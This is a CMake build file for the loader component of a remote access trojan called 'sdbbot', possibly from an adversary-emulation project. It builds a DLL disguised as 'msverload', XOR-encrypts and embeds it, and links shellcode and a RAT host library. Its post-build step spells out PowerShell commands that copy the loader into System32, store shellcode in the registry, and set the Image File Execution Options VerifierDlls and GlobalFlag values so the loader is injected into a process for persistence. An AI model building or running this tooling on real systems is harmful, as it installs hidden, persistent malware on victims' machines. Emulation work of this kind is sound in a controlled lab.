# Loader DLL
add_library(loader SHARED)
set_target_properties(loader PROPERTIES OUTPUT_NAME_RELEASE msverload)

target_link_libraries(
    loader
    PRIVATE
        common
        phnt::headers
        ${RAT_HOST_DLL}.lib
        ws2_32.lib
)

target_link_options(
    loader
    PRIVATE
        "/SECTION:.test,rwe"
        /INCLUDE:${RAT_HOST_DLL_EXPORT}
        /INCLUDE:freeaddrinfo
)

target_include_directories(
    loader
    PUBLIC
        "${CMAKE_SOURCE_DIR}/include"
        "${CMAKE_SOURCE_DIR}/src/shellcode"
)

target_sources(
    loader
    PRIVATE
        "main.cpp"
        "loader.cpp"
    PUBLIC
        FILE_SET
            loader_headers
        TYPE
            HEADERS
        FILES
            "loader.hpp"
            "verifier.hpp"
)

#Alternative Loader DLL
add_library(alternative-loader SHARED)
set_target_properties(alternative-loader PROPERTIES OUTPUT_NAME_RELEASE msverload_alt)

target_link_libraries(
    alternative-loader
    PRIVATE
        common
        phnt::headers
#        ${RAT_HOST_DLL}.lib
        ws2_32.lib
)

target_link_options(
    alternative-loader
    PRIVATE
#        "/SECTION:.test,rwe"
#        /INCLUDE:${RAT_HOST_DLL_EXPORT}
        /INCLUDE:freeaddrinfo
)

target_include_directories(
    alternative-loader
    PUBLIC
        "${CMAKE_SOURCE_DIR}/include"
        "${CMAKE_SOURCE_DIR}/src/shellcode"
)

target_sources(
    alternative-loader
    PRIVATE
        "alternative_main.cpp"
        "loader.cpp"
    PUBLIC
        FILE_SET
            loader_headers
        TYPE
            HEADERS
        FILES
            "loader.hpp"
)

# XOR-encrypt loader DLL and then embed in header
add_custom_command(
    OUTPUT "$<CONFIG>/loader.dll.hpp"
    COMMAND powershell.exe -file "${CMAKE_SOURCE_DIR}/tools/xor_file.ps1" -key "${RESOURCE_XOR_KEY_HEX}" -infile "$<TARGET_FILE:loader>" -outfile "$<TARGET_FILE:loader>.xor"
    COMMAND bin2h "$<TARGET_FILE:loader>.xor" ${CMAKE_SOURCE_DIR}/src/loader/loader.dll.hpp.in $<CONFIG>/loader.dll.hpp
    DEPENDS loader
    COMMENT "Generating header with embedded XOR-encrypted loader"
)

add_library(loader-header INTERFACE)

target_sources(
    loader-header
    PUBLIC
    FILE_SET loader_header
    TYPE HEADERS
    FILES
    "${CMAKE_CURRENT_BINARY_DIR}/$<CONFIG>/loader.dll.hpp"
    BASE_DIRS
    "${CMAKE_CURRENT_BINARY_DIR}/$<CONFIG>"
)

# Post build actions for loader when running in debug mode to establish launch mechanism and drop shellcode for the loader to run
set(IFEO_HIVE "HKLM:")
set(IFEO_KEY "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\")
set(IFEO_PATH "HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\")

file(SIZE ${PROJECT_SOURCE_DIR}/data/shellcode-prefix.txt SHELLCODE_PREFIX_SIZE)

# Add compiler definitions to import cmake variables
target_compile_definitions(
    loader PRIVATE
    LOADER_SHELLCODE_VALUE="${LOADER_SHELLCODE_VALUE}"
    LOADER_SHELLCODE_KEY="${LOADER_SHELLCODE_KEY}"
    SHELLCODE_PREFIX_SIZE=${SHELLCODE_PREFIX_SIZE}
    $<$<CONFIG:Debug>:DEBUG>
)

target_compile_definitions(
    alternative-loader PRIVATE
    LOADER_SHELLCODE_VALUE="${LOADER_SHELLCODE_VALUE}"
    LOADER_SHELLCODE_KEY="${LOADER_SHELLCODE_KEY}"
    SHELLCODE_PREFIX_SIZE=${SHELLCODE_PREFIX_SIZE}
    RAT_HOST_DLL="${RAT_HOST_DLL}"
    $<$<CONFIG:Debug>:DEBUG>
)

if(LOADER_STUB_INSTALLER)
  add_custom_command(
    TARGET loader POST_BUILD

    # Copy the loader into system32
    COMMAND ${CMAKE_COMMAND} -E copy_if_different $<TARGET_FILE:loader> "$ENV{WINDIR}/System32/$<TARGET_FILE_NAME:loader>"

    # Create the registry key for the shellcode and rat
    COMMAND powershell.exe "New-Item -Path '${IFEO_PATH}' -Name '${LOADER_SHELLCODE_KEY}' -Force"
    
    # Create the registry value for the shellcode and rat
    COMMAND powershell.exe "Set-ItemProperty -Path '${IFEO_PATH}${LOADER_SHELLCODE_KEY}' -Name '${LOADER_SHELLCODE_VALUE}' -Type Binary -Value ${LOADER_SHELLCODE_DATA}"

    # Create the registry IFEO key
    COMMAND powershell.exe "New-Item -Path '${IFEO_PATH}$<TARGET_FILE_NAME:loader-runner>' -Force"

    # Create the registry value for the IFEO VerifierDlls
    COMMAND powershell.exe "Set-ItemProperty -Path '${IFEO_PATH}$<TARGET_FILE_NAME:loader-runner>' -Name 'VerifierDlls' -Value '$<TARGET_FILE_NAME:loader>'"

    # Create the registry value for the IFEO GlobalFlag
    COMMAND powershell.exe "Set-ItemProperty -Path '${IFEO_PATH}$<TARGET_FILE_NAME:loader-runner>' -Name 'GlobalFlag' -Type DWORD -Value 0x100"

    COMMENT "Using installer stub for loader setup"
)
else()
  # Need to make this a toggle for dev builds only, otherwise CI/CD will try to install the loader DLL
  # add_custom_command(TARGET loader POST_BUILD COMMAND installer-runner COMMENT "Installing sdbbot locally")
endif()

# Add unit test .cpp files here
target_sources(
    sdbbot-test
    PRIVATE
    
    $<FILTER:$<TARGET_OBJECTS:loader>,EXCLUDE,main.cpp.obj>
    PRIVATE
    FILE_SET loader_headers
    TYPE HEADERS
)

